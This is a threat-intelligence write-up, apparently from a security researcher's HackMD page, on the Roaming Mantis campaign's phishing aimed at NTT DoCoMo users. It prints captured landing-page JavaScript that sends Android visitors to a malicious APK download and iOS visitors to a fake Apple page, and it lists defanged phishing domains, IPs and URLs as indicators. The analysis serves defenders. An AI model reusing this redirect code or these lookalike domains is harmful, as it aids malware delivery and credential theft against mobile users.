# Reference for threat actor for "Roaming Mantis"

**Title**: Roaming Mantis: a new phishing method targets a Japanese MNO - HackMD

**Source**: https://hackmd.io/@ninoseki/Bkw66OhAN

## Content











Roaming Mantis: a new phishing method targets a Japanese MNO - HackMD





































                                         




                                                にのせき
                                            











                                             



Linked with GitHub









































# Roaming Mantis: a new phishing method targets a Japanese MNO

Roaming Mantis is a campaign named by Kaspersky.

> In March 2018, Japanese media reported the hijacking of DNS settings on routers located in Japan, redirecting users to malicious IP addresses. The redirection led to the installation of Trojanized applications named facebook.apk and chrome.apk that contained Android Trojan-Banker.
>  
>  Since we didn’t find a pre-existing name for this malware operation, we decided to assign a new one for future reference. Based on its propagation via smartphones roaming between Wi-Fi networks, potentially carrying and spreading the infection, we decided to call it ‘Roaming Mantis’.
>  
> (source: https://securelist.com/roaming-mantis-uses-dns-hijacking-to-infect-android-smartphones/85178/)

This campaign uses Android malware and also phishing scams.

For example, a Roaming Mantis landing page redirects a user to a phishing website when a victim uses an iOS device.

```javascript=
if ((navigator.language || navigator.browserLanguage).toLowerCase().startsWith("ja")) {

} else {
    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    if (isAndroid) {
        window.alert(getString(0));
        window.location.href = "http://" + location.hostname + "/" + Math.random().toString().substring(2, 10) + ".apk"
    }

    function isPC() {
        var userAgentInfo = navigator.userAgent;
        var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
        var flag = true;
        for (var v = 0; v < Agents.length; v++) {
            if (userAgentInfo.indexOf(Agents[v]) > 0) {
                flag = false;
                break;
            }
        }
        return flag;
    }
    if (isPC()) {

    }
    if (isiOS) {
        window.alert(getString(1));
        window.location.href = "http://security.apple.com/";
    }
}
```

Note that a victim of this campaign is controlled under a rogue DNS.

The rogue DNS resolved `security.apple.com` to `172.247.116[.]155`. This is an IP address of a phishing website impersonates Apple.

![](https://i.imgur.com/pOhaCh6.png)

## Roaming Mantis 2019 ver.

Roaming Mantis seems disappeared since late 2018 but it comes back with new techniques this spring.

- [Roaming Mantis, part IV: Mobile config for Apple phishing, and re-spreading an updated malicious APK (MoqHao/XLoader)](https://securelist.com/roaming-mantis-part-iv/90332/)

The new Roaming Mantis landing page has a mysterious if-else branch.

```javascript=
if ((navigator.language || navigator.browserLanguage).toLowerCase().startsWith("ja11111111")) {
    setTimeout(function () {
        window.alert(getString(0));
        window.location.href = "https://play.google.com/store/apps/details?id=com.jptest.tools2019"
    }, 500);
}
```

`https://play.google.com/store/apps/details?id=com.jptest.tools2019` returns 404 even if using a rogue DNS.

![](https://i.imgur.com/onuL5Bj.png)

However, the DOM structure of Roaming Mantis landing page is  changed on 2019/06/10.

![](https://i.imgur.com/0zSZd1p.png)

![](https://i.imgur.com/hQUtD4W.png)

![](https://i.imgur.com/rWG147Z.png)

Obviously, the message(`【ドコモ契約者様へ】お客様がご利用のdカードが第三者に不正利用の可能性がございます。設定ページに切り替えますので、必ず本人認証設定をお願いします。`) and the website(`hXXp://www.nttdocomo-urt[.]com`) indicates that Roaming Mantis targets a Japanese MNO, NTT DoCoMo.

![](https://i.imgur.com/C5CSdXL.png)

Interestingly, this phishing website has a similarity with a phishing campaign I called `GaoHao`.

GaoHao targets Japanese brands such as NTT, KDDI, SoftBank, Rakuten, etc.

```csv
// an example list of GaoHao phishing website domains
docomo-login[.]com
securitys-docomo[.]com
nttdocomo-services[.]com
softbank-securitys[.]com
softbank-b[.]com
docomo-security[.]com
mydocomo-smt-security[.]com
mysoftbank-uses[.]com
docomo-id[.]com
rakuten-card.gnway[.]cc
info-docomo[.]com
nttdocomo-smt-security[.]com
nttdocomo-detect[.]com
myau-securitys[.]com
myau-supports[.]com
security-docomo[.]com
nttdocomo-smt-supports[.]com
mydocomo-smt-supports[.]com
softbank-sos[.]com
bank-softbank[.]com
```

There is a common character in GaoHao phishing websites.
They use `action_XXX` as cookie names. 

![](https://i.imgur.com/mdCANjP.png)

`hXXp://www.nttdocomo-urt[.]com` uses the same cookie names.

![](https://i.imgur.com/NDiuPTY.png)

I don't have absolute confidence but I think this overlap suggests a connection between Roaming Mantis and GaoHao gangs.

## IoC

### Landing pages (2019 ver.)

```
1[.]171.152.3
1[.]171.153.177
1[.]171.156.4
1[.]171.156.75
1[.]171.158.27
1[.]171.158.91
1[.]171.160.146
1[.]171.160.155
1[.]171.163.183
1[.]171.164.249
1[.]171.165.17
1[.]171.166.13
1[.]171.166.219
1[.]171.168.19
1[.]171.169.160
1[.]171.169.221
1[.]171.170.228
1[.]171.171.155
1[.]171.171.52
1[.]171.174.39
1[.]171.175.119
1[.]171.176.65
1[.]171.177.233
1[.]171.180.25
1[.]171.40.74
1[.]171.41.62
1[.]171.46.86
1[.]171.47.224
1[.]171.48.241
1[.]171.51.250
1[.]171.52.233
1[.]171.53.165
1[.]171.53.54
1[.]171.53.58
1[.]171.54.203
1[.]171.59.137
1[.]171.59.144
1[.]171.60.242
1[.]171.61.13
1[.]171.61.201
1[.]171.62.207
61[.]230.100.213
61[.]230.101.102
61[.]230.101.49
61[.]230.102.66
61[.]230.154.202
61[.]230.154.31
61[.]230.155.90
61[.]230.155.93
61[.]230.156.188
```

### Other phihsing websites

```csv
hXXp://sasekr-qwq[.]top/xvideo/
hXXp://apple.varifidogiones[.]com/verification/apple/alert
hXXp://bqh.idq.mybluehost[.]me
```





                Last changed by
                 
            









             




                    にのせき
                












0









3027









                        Add a comment
                    






Read more


Tracking & managing unstructured IoCs with MISP
InQuestのThreatIngestorを使うと、構造化されていないIoC(e.g blogやtweetなど)を取集することができます。

Supported IoC:

IP address, domain, URL, hash(MD5, SHA1, SHA256, SHA512), YARA rule

Input:

Beanstalk work queues, Git repositories, GitHub repository search, RSS feeds, Amazon SQS queues, Twitter, Generic web pages


                        4/13/2020
                    


Resistance is Futile – The Undefendable Supply-Chain Attack


                        10/29/2019
                    


Transparency in the Software Supply Chain: Making SBOM a Reality


                        10/29/2019
                    


CODE BLUE 2019 Collaborative Notes


                        10/23/2019
                    




                    Read more from にのせき
                




Published on  HackMD























×
Sign in





Email









Password






Forgot password







or
By clicking below, you agree to our terms of service.









 Sign in via Facebook
    

 Sign in via Twitter
    

 Sign in via GitHub
    

 Sign in via Dropbox
    


New to HackMD? Sign up
















